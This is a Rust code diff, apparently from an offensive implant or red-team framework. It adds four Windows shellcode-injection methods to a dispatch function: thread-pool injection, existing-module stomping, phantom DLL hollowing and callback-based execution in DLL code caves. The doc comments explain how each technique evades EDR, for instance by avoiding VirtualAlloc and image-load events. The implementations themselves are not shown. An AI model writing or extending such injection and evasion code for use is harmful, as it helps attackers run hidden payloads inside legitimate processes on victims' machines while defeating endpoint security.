@@ -10,6 +10,14 @@ pub mod module_stomp;
 pub mod nt_create_thread;
 #[cfg(windows)]
 pub mod remote_thread;
+#[cfg(windows)]
+pub mod thread_pool;
+#[cfg(windows)]
+pub mod existing_module_stomp;
+#[cfg(all(windows, feature = "phantom-dll-hollow"))]
+pub mod phantom_dll_hollow;
+#[cfg(all(windows, target_arch = "x86_64"))]
+pub mod callback_exec;
 
 #[cfg(windows)]
 #[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
@@ -21,6 +29,32 @@ pub enum InjectionMethod {
     ModuleStomp,
     DllSideLoad,
     EarlyBird,
+    /// Thread pool injection via TpAllocWork/TpPostWork — no remote thread creation.
+    /// Shellcode executes on an existing thread pool worker thread.
+    ThreadPool,
+    /// Existing-module stomping: overwrites the `.text` section of an already-loaded
+    /// DLL backed on disk — **no LoadLibrary / LdrLoadDll call**. The module appears
+    /// completely legitimate to EDR: valid PEB entry, real on-disk backing, no image-load
+    /// events. Prefer over `ModuleStomp` when stealth is paramount.
+    ExistingModuleStomp,
+    /// Phantom DLL hollowing: creates a section object backed by the payload DLL
+    /// (never written to disk), creates a legitimate host process suspended, unmaps
+    /// the host image, maps the phantom section into the host process address space,
+    /// fixes relocations + IAT, updates PEB ImageBaseAddress, and resumes.  The
+    /// resulting process appears legitimate (host binary on disk) but executes
+    /// the phantom DLL code.  No VirtualAlloc / VirtualAllocEx — uses exclusively
+    /// NtCreateSection + NtMapViewOfSection.
+    #[cfg(feature = "phantom-dll-hollow")]
+    PhantomDllHollow,
+    /// Callback-based execution without allocation: places shellcode in code caves
+    /// (padding bytes within legitimately loaded DLL `.text` sections) and triggers
+    /// execution by hijacking existing callback mechanisms.  Three techniques:
+    /// (1) WndProc hijack — overwrites a window's message handler and posts a message,
+    /// (2) Fiber hijack — creates a fiber pointing to the shellcode and switches to it,
+    /// (3) Thread pool callback — posts a work item whose callback is the shellcode.
+    /// No VirtualAlloc / VirtualAllocEx / NtAllocateVirtualMemory for executable memory.
+    /// Shellcode lives in disk-backed DLL pages with PAGE_EXECUTE_READ protection.
+    CallbackExec,
 }
 
 #[cfg(target_os = "linux")]
@@ -268,6 +302,51 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
         }
         InjectionMethod::ManualMap => manual_map_inject(pid, payload),
         InjectionMethod::DllSideLoad => dll_sideload::DllSideLoadInjector.inject(pid, payload),
+        InjectionMethod::ThreadPool => thread_pool::ThreadPoolInjector.inject(pid, payload),
+        InjectionMethod::ExistingModuleStomp => {
+            existing_module_stomp::ExistingModuleStompInjector.inject(pid, payload)
+        }
+        #[cfg(feature = "phantom-dll-hollow")]
+        InjectionMethod::PhantomDllHollow => {
+            // Phantom DLL hollowing creates its own sacrificial host process.
+            // The `pid` parameter is intentionally ignored.
+            if pid != 0 {
+                log::warn!(
+                    "InjectionMethod::PhantomDllHollow ignores the target pid ({pid}); \
+                     it always creates a new host process."
+                );
+            }
+            let _ = pid;
+            unsafe {
+                phantom_dll_hollow::phantom_dll_hollow(payload)
+                    .map(|_| ())
+                    .map_err(|e| anyhow::anyhow!("{}", e))
+            }
+        }
+        InjectionMethod::CallbackExec => {
+            // Callback-based execution operates in the current process (local).
+            // The `pid` parameter is intentionally ignored.
+            if pid != 0 {
+                log::warn!(
+                    "InjectionMethod::CallbackExec ignores the target pid ({pid}); \
+                     it executes locally via callback hijack."
+                );
+            }
+            let _ = pid;
+            #[cfg(target_arch = "x86_64")]
+            {
+                callback_exec::CallbackExecInjector::new(
+                    callback_exec::CallbackTechnique::default(),
+                )
+                .inject(pid, payload)
+            }
+            #[cfg(not(target_arch = "x86_64"))]
+            {
+                Err(anyhow::anyhow!(
+                    "CallbackExec injection is only supported on x86_64 Windows"
+                ))
+            }
+        }
     }
 }
 
